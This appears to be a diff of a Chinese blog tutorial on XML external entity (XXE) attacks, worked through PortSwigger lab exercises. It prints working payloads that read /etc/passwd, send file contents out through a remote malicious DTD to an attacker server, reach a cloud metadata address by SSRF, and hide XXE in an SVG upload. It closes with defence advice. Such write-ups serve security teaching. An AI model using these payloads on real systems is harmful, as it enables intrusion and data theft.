@@ -291,7 +291,7 @@
                 
 
                 <blockquote>
-<p>本文首发于 FreeBuf <a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/330086.html" >https://www.freebuf.com/articles/web/330086.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>本文首发于 FreeBuf <a class="link" target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/330086.html">https://www.freebuf.com/articles/web/330086.html<i class="fas fa-external-link-alt"></i></a></p>
 </blockquote>
 <span id="more"></span>
 <h1 id="从0到1完全掌握XXE"><a href="#从0到1完全掌握XXE" class="headerlink" title="从0到1完全掌握XXE"></a>从0到1完全掌握XXE</h1><h2 id="0x01-前置知识-XML-定义实体"><a href="#0x01-前置知识-XML-定义实体" class="headerlink" title="0x01 前置知识 XML 定义实体"></a>0x01 前置知识 XML 定义实体</h2><p>XML 实体允许定义在分析 XML 文档时将由内容替换的标记，这里我的理解就是定义变量，然后赋值的意思一致。就比如一些文件上传的 payload 中就会有。</p>
@@ -302,11 +302,11 @@
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">receiver</span>&gt;</span>Myself<span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sender</span>&gt;</span>Someone<span class="tag">&lt;/<span class="name">sender</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">header</span>&gt;</span>TheReminder<span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">msg</span>&gt;</span>This is an amazing book<span class="tag">&lt;/<span class="name">msg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>而我们必须在 DTD 中创建一个实体，DTD 也就是定义文档类型的文件，一般来说都有 <code>&lt;!DOCTYPE</code> 这种字样。</p>
-
+<img src="/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/xxe-parser.png" class>
 
 <p>一旦解析器处理了 XML 文档，它将用定义的常量“Jo Smith”替换定义的实体 <code>&amp;js</code></p>
 <p>大多数情况下，框架会根据 xml 结构自动填充 Java 对象。</p>
-
+<img src="/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/xxe-parser-java.png" class>
 
 <p>通俗一点自己写一段代码的话</p>
 <p><strong>示例代码：</strong></p>
@@ -321,7 +321,7 @@
 <p>个人认为，XXE 可以归结为一句话：构造恶意 DTD</p>
 </blockquote>
 <p>介绍 XXE 之前，我先来说一下普通的 XML 注入，这个的利用面比较狭窄，如果有的话应该也是逻辑漏洞。</p>
-
+<img src="/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/EasyXML.png" class>
 
 <p>既然能插入 XML 代码，那我们肯定不能善罢甘休，我们需要更多，于是出现了 XXE。</p>
 <p>XML 外部实体注入，全称为 XML external entity injection，某些应用程序允许 XML 格式的数据输入和解析，可以通过引入外部实体的方式进行攻击。</p>
@@ -362,20 +362,20 @@
 <p>test -&gt; “file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd” 通俗易懂</p>
 <p>我们依靠一道靶场来加强一下感受</p>
 <blockquote>
-<h5 id="Lab-Exploiting-XXE-using-external-entities-to-retrieve-files"><a href="#Lab-Exploiting-XXE-using-external-entities-to-retrieve-files" class="headerlink" title="Lab: Exploiting XXE using external entities to retrieve files"></a><a class="link"   target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files" >Lab: Exploiting XXE using external entities to retrieve files<i class="fas fa-external-link-alt"></i></a></h5></blockquote>
+<h5 id="Lab-Exploiting-XXE-using-external-entities-to-retrieve-files"><a href="#Lab-Exploiting-XXE-using-external-entities-to-retrieve-files" class="headerlink" title="Lab: Exploiting XXE using external entities to retrieve files"></a><a class="link" target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files">Lab: Exploiting XXE using external entities to retrieve files<i class="fas fa-external-link-alt"></i></a></h5></blockquote>
 <ul>
 <li>题意：通过 XXE 注入爆出 <code>/etc/passwd</code> 的内容</li>
 </ul>
 <p>进入靶场之后，先点击任意一个商品 - “view details”，再 Check stock 并抓包。</p>
 <p>这里的 productId 以及 storeId 是通过 XML 的形式传进来的，尝试通过 File 协议进行文件读取</p>
-
+<img src="/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/FileXXE.png" class>
 
 <p>payload：</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">any</span>[<span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">productId</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">productId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">storeId</span>&gt;</span></span><br><span class="line">4</span><br><span class="line"><span class="tag">&lt;/<span class="name">storeId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
+<img src="/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/SuccFileXXE.png" class>
 
-
-<p>至于为什么会产生这个漏洞，如果想学习代码审计的师傅可以移步至我博客细究一下 <a class="link"   target="_blank" rel="noopener" href="https://withd-raw.github.io/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/" >代码审计XXE注入 | 芜风<i class="fas fa-external-link-alt"></i></a></p>
+<p>至于为什么会产生这个漏洞，如果想学习代码审计的师傅可以移步至我博客细究一下 <a class="link" target="_blank" rel="noopener" href="https://withd-raw.github.io/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/">代码审计XXE注入 | 芜风<i class="fas fa-external-link-alt"></i></a></p>
 <h3 id="2-XXE-盲注"><a href="#2-XXE-盲注" class="headerlink" title="2. XXE 盲注"></a>2. XXE 盲注</h3><ul>
 <li>所谓盲注，就是无回显</li>
 </ul>
@@ -387,7 +387,7 @@
 <p>payload：</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">stockCheck</span> [<span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://d0eh504fzx1hdqnbch9xrbfe056vuk.burpcollaborator.net&quot;</span>&gt;</span> %xxe; ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">productId</span>&gt;</span></span><br><span class="line">		<span class="symbol">&amp;xxe;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">productId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">storeId</span>&gt;</span></span><br><span class="line">		1</span><br><span class="line">	<span class="tag">&lt;/<span class="name">storeId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/Out-of-band.png" class>
 
 <h4 id="2-多个-DTD-的调用攻击"><a href="#2-多个-DTD-的调用攻击" class="headerlink" title="(2) 多个 DTD 的调用攻击"></a>(2) 多个 DTD 的调用攻击</h4><p>这里以 PHP 代码为例进行说明</p>
 <p>xml.php</p>
@@ -396,9 +396,9 @@
 <p>直接上 payload，并用 payload 加以理解</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://ip/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]</span></span><br></pre></td></tr></table></figure>
 
-<p>这是我们对要进行渗透的 payload，有三个参数 <code>%remote, %int, %send</code>；后面接的网站 <a class="link"   target="_blank" rel="noopener" href="http://ip/test.dtd" >http://ip/test.dtd<i class="fas fa-external-link-alt"></i></a> 是我们挂在服务器&#x2F;第三方网站的恶意 DTD。我们在这个第三方网站的恶意 DTD 中添加第二层恶意 DTD</p>
+<p>这是我们对要进行渗透的 payload，有三个参数 <code>%remote, %int, %send</code>；后面接的网站 <a class="link" target="_blank" rel="noopener" href="http://ip/test.dtd">http://ip/test.dtd<i class="fas fa-external-link-alt"></i></a> 是我们挂在服务器&#x2F;第三方网站的恶意 DTD。我们在这个第三方网站的恶意 DTD 中添加第二层恶意 DTD</p>
 <p><strong>test.dtd</strong></p>
-
+<img src="/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/BlindDTD.png" class>
 
 <p>接着，<code>%int</code> 去调用 test.dtd 当中的 file，这里稍微慢一点，分析一下<code> % int &quot;&lt;!ENTITY % send SYSTEM &#39;http://ip:9999?p=%file;</code>；也就是 %file 在前面被定义，而 %file 则是恶意读取了文件，这里可以替换成 &#x2F;etc&#x2F;passwd 这类。</p>
 <p>如此一来，%int 成为了这个网站的恶意 DTD，在 %int 里面定义了一个 %send 的变量名称。由此，最后一个调用的参数 <code>%send</code> 就相当于我们在上面一个案例中的基础 payload</p>
@@ -406,22 +406,22 @@
 
 <p>这样，我们三层的 payload 经过抽丝剥茧，变成了一层简单的 payload。<br>接下来我们来看一道简单的 Port 靶场上的盲注</p>
 <blockquote>
-<h5 id="Lab-Exploiting-blind-XXE-to-exfiltrate-data-using-a-malicious-external-DTD"><a href="#Lab-Exploiting-blind-XXE-to-exfiltrate-data-using-a-malicious-external-DTD" class="headerlink" title="Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD"></a><a class="link"   target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration" >Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD<i class="fas fa-external-link-alt"></i></a></h5></blockquote>
+<h5 id="Lab-Exploiting-blind-XXE-to-exfiltrate-data-using-a-malicious-external-DTD"><a href="#Lab-Exploiting-blind-XXE-to-exfiltrate-data-using-a-malicious-external-DTD" class="headerlink" title="Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD"></a><a class="link" target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration">Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD<i class="fas fa-external-link-alt"></i></a></h5></blockquote>
 <ul>
 <li>题目要求我们爆出 &#x2F;etc&#x2F;hostname 的文件</li>
 </ul>
 <p>依旧是在 Stock 界面进行抓包，同样是 XML 形式</p>
-
+<img src="/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/BlindDTDBag.png" class>
 
 <p>Port 里面的渗透测试是给我们第三方的服务器的，也就是 exploit server，但是在真正的渗透测试中，如果要测盲注的话，还是需要自己的服务器的。</p>
 <p>按照之前的思路，进行多层恶意 DTD 的构造，并把这个恶意 DTD 挂在第三方服务器上面。</p>
-
+<img src="/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/BlindDTDServer.png" class>
 
 <p>这里点 Store，因为存储之后，就等于你在你自己的服务器上面有了这个恶意的 DTD，一会儿复用即可。恶意 DTD 的 URL 我放在下面，每个人进靶场都是不一样的</p>
 <ul>
-<li>URL: <a class="link"   target="_blank" rel="noopener" href="https://exploit-acbc1f081e35bba3c0a7180f0145001b.web-security-academy.net/exploit" >https://exploit-acbc1f081e35bba3c0a7180f0145001b.web-security-academy.net/exploit<i class="fas fa-external-link-alt"></i></a></li>
+<li>URL: <a class="link" target="_blank" rel="noopener" href="https://exploit-acbc1f081e35bba3c0a7180f0145001b.web-security-academy.net/exploit">https://exploit-acbc1f081e35bba3c0a7180f0145001b.web-security-academy.net/exploit<i class="fas fa-external-link-alt"></i></a></li>
 </ul>
-
+<img src="/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/BlindDTDPayload.png" class>
 
 <p>成功，我们 exploit 的 <code>/etc/hostname</code> 在 GET 请求参数中</p>
 <h4 id="3-报错型盲注"><a href="#3-报错型盲注" class="headerlink" title="(3) 报错型盲注"></a>(3) 报错型盲注</h4><ul>
@@ -442,13 +442,13 @@
 <p>先调用 <code>&amp;xxe;</code>，<code>&amp;xxe;</code> 去调用上面的恶意 DTD，恶意 DTD 调用了 <code>file:///etc/passwd</code> 这一操作，这一操作，又被 <code>&amp;eval</code> 中的内容又会在 <code>&amp;exfil</code> 中的 <code>&#39;file:///invalid/%file;&#39;</code> 所调用。但是 invalid&#x2F;%file 后面的内容一定是报错的，这个报错消息反而会被带出来。</p>
 <p>这也就是 XXE 盲注中的报错注入</p>
 <blockquote>
-<h5 id="Lab-Exploiting-blind-XXE-to-retrieve-data-via-error-messages"><a href="#Lab-Exploiting-blind-XXE-to-retrieve-data-via-error-messages" class="headerlink" title="Lab: Exploiting blind XXE to retrieve data via error messages"></a><a class="link"   target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages" >Lab: Exploiting blind XXE to retrieve data via error messages<i class="fas fa-external-link-alt"></i></a></h5></blockquote>
+<h5 id="Lab-Exploiting-blind-XXE-to-retrieve-data-via-error-messages"><a href="#Lab-Exploiting-blind-XXE-to-retrieve-data-via-error-messages" class="headerlink" title="Lab: Exploiting blind XXE to retrieve data via error messages"></a><a class="link" target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages">Lab: Exploiting blind XXE to retrieve data via error messages<i class="fas fa-external-link-alt"></i></a></h5></blockquote>
 <p>根据上述的方法，先在 exploit server 中投放恶意 DTD，再在抓包界面进行调用第三方服务器上的 DTD，便可造成报错注入。</p>
 <h3 id="3-利用-XXE-执行-SSRF"><a href="#3-利用-XXE-执行-SSRF" class="headerlink" title="3. 利用 XXE 执行 SSRF"></a>3. 利用 XXE 执行 SSRF</h3><h4 id="书说上文的-file-协议"><a href="#书说上文的-file-协议" class="headerlink" title="书说上文的 file 协议"></a>书说上文的 file 协议</h4><p>我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求。</p>
 <p>我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？</p>
 <p>没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。</p>
 <h4 id="新的利用方式"><a href="#新的利用方式" class="headerlink" title="新的利用方式"></a>新的利用方式</h4><p>不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议。</p>
-
+<img src="/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/DiffProtocol.png" class>
 
 <p>我们的 payload 一般长这样</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://对方的内网IP&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">	<span class="symbol">&amp;xxe;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>
@@ -465,7 +465,7 @@
 <blockquote>
 <h5 id="靶场：Lab-Exploiting-XXE-to-perform-SSRF-attacks"><a href="#靶场：Lab-Exploiting-XXE-to-perform-SSRF-attacks" class="headerlink" title="靶场：Lab: Exploiting XXE to perform SSRF attacks"></a>靶场：Lab: Exploiting XXE to perform SSRF attacks</h5></blockquote>
 <p>常规抓包</p>
-
+<img src="/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/xxe_SSRF.png" class>
 
 <p>构造 payload</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://169.254.169.254/&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">productId</span>&gt;</span></span><br><span class="line">		<span class="symbol">&amp;xxe;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">productId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">storeId</span>&gt;</span></span><br><span class="line">		1</span><br><span class="line">	<span class="tag">&lt;/<span class="name">storeId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure>
@@ -484,13 +484,13 @@
 
 <p>这样一来，我们想要知道的信息就能够被暴露在上传的图片当中，也就是此 SVG 图片中。</p>
 <blockquote>
-<h5 id="Lab-Exploiting-XXE-via-image-file-upload"><a href="#Lab-Exploiting-XXE-via-image-file-upload" class="headerlink" title="Lab: Exploiting XXE via image file upload"></a><a class="link"   target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload" >Lab: Exploiting XXE via image file upload<i class="fas fa-external-link-alt"></i></a></h5></blockquote>
+<h5 id="Lab-Exploiting-XXE-via-image-file-upload"><a href="#Lab-Exploiting-XXE-via-image-file-upload" class="headerlink" title="Lab: Exploiting XXE via image file upload"></a><a class="link" target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload">Lab: Exploiting XXE via image file upload<i class="fas fa-external-link-alt"></i></a></h5></blockquote>
 <p>前往 blog 的评论区界面，先事先创建好 1.svg，并在 SVG 文件当中编辑如下，作为我们的 payload</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> standalone=<span class="string">&quot;yes&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/hostname&quot;</span> &gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;128px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;128px&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">text</span> <span class="attr">font-size</span>=<span class="string">&quot;16&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;16&quot;</span>&gt;</span></span><br><span class="line"> <span class="symbol">&amp;xxe;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>上传后，我们的 SVG 图片中突然多了些许文字，点进去查看即可解题。</p>
 <h4 id="2-利用-jar-x2F-x2F-协议的攻击"><a href="#2-利用-jar-x2F-x2F-协议的攻击" class="headerlink" title="(2) 利用 jar:&#x2F;&#x2F; 协议的攻击"></a>(2) 利用 jar:&#x2F;&#x2F; 协议的攻击</h4><blockquote>
-<p>这一段内容参考于 <a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357#toc-14" >K0rz3n 师傅的文章<i class="fas fa-external-link-alt"></i></a></p>
+<p>这一段内容参考于 <a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357#toc-14">K0rz3n 师傅的文章<i class="fas fa-external-link-alt"></i></a></p>
 </blockquote>
 <p><strong>jar:&#x2F;&#x2F; 协议的格式：</strong></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar:&#123;url&#125;!&#123;path&#125;</span><br></pre></td></tr></table></figure>
@@ -517,8 +517,8 @@
 
 <p>不同的是，这里我们被禁止定义 <code>DOCTYPE</code>，所以要对 Web 元素下手。</p>
 <blockquote>
-<h5 id="Lab-Exploiting-XInclude-to-retrieve-files"><a href="#Lab-Exploiting-XInclude-to-retrieve-files" class="headerlink" title="Lab: Exploiting XInclude to retrieve files"></a><a class="link"   target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/lab-xinclude-attack" >Lab: Exploiting XInclude to retrieve files<i class="fas fa-external-link-alt"></i></a></h5></blockquote>
-
+<h5 id="Lab-Exploiting-XInclude-to-retrieve-files"><a href="#Lab-Exploiting-XInclude-to-retrieve-files" class="headerlink" title="Lab: Exploiting XInclude to retrieve files"></a><a class="link" target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/lab-xinclude-attack">Lab: Exploiting XInclude to retrieve files<i class="fas fa-external-link-alt"></i></a></h5></blockquote>
+<img src="/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/XincludeXXE.png" class>
 
 <h3 id="6-别样的利用方式，复用本地-DTD"><a href="#6-别样的利用方式，复用本地-DTD" class="headerlink" title="6. 别样的利用方式，复用本地 DTD"></a>6. 别样的利用方式，复用本地 DTD</h3><p>这种攻击手段，一般是源于服务器与 VPS 之间存在防火墙，导致数据无法带出。</p>
 <ul>
@@ -539,7 +539,7 @@
 <p>这么干讲还是有点太抽象了，我们看一道靶场体验一下。</p>
 </blockquote>
 <blockquote>
-<h5 id="Lab-Exploiting-XXE-to-retrieve-data-by-repurposing-a-local-DTD"><a href="#Lab-Exploiting-XXE-to-retrieve-data-by-repurposing-a-local-DTD" class="headerlink" title="Lab: Exploiting XXE to retrieve data by repurposing a local DTD"></a><a class="link"   target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd" >Lab: Exploiting XXE to retrieve data by repurposing a local DTD<i class="fas fa-external-link-alt"></i></a></h5></blockquote>
+<h5 id="Lab-Exploiting-XXE-to-retrieve-data-by-repurposing-a-local-DTD"><a href="#Lab-Exploiting-XXE-to-retrieve-data-by-repurposing-a-local-DTD" class="headerlink" title="Lab: Exploiting XXE to retrieve data by repurposing a local DTD"></a><a class="link" target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd">Lab: Exploiting XXE to retrieve data by repurposing a local DTD<i class="fas fa-external-link-alt"></i></a></h5></blockquote>
 <ul>
 <li>题目要求我们获得 &#x2F;etc&#x2F;passwd 的内容，并且告诉了我们本地 DTD 的路径；以及实体类的名称。</li>
 </ul>
@@ -548,7 +548,7 @@
 
 <p>剖析 payload</p>
 <p>这里我们调用了本地的 dockbookx.dtd，在调用本地的 dockbookx.dtd 的同时，复写了 ISOamso 这一实体类，ISOamso 被调用的时候就执行了我们的恶意命令，从而达到读取文件的效果。</p>
-
+<img src="/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/XXEUseLocalDTD.png" class>
 
 <h3 id="7-XXE-造成的-DOS"><a href="#7-XXE-造成的-DOS" class="headerlink" title="7. XXE 造成的 DOS"></a>7. XXE 造成的 DOS</h3><ul>
 <li>payload 比较简单</li>
@@ -568,7 +568,7 @@
 <ul>
 <li>禁用外部实体是防御 XXE 最有效的方式</li>
 </ul>
-<h2 id="0x06-参考资料"><a href="#0x06-参考资料" class="headerlink" title="0x06 参考资料"></a>0x06 参考资料</h2><p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357" >https://xz.aliyun.com/t/3357<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/106330095" >https://blog.csdn.net/qq_38154820/article/details/106330095<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="0x06-参考资料"><a href="#0x06-参考资料" class="headerlink" title="0x06 参考资料"></a>0x06 参考资料</h2><p><a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357">https://xz.aliyun.com/t/3357<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/106330095">https://blog.csdn.net/qq_38154820/article/details/106330095<i class="fas fa-external-link-alt"></i></a></p>
 
             </div>
 
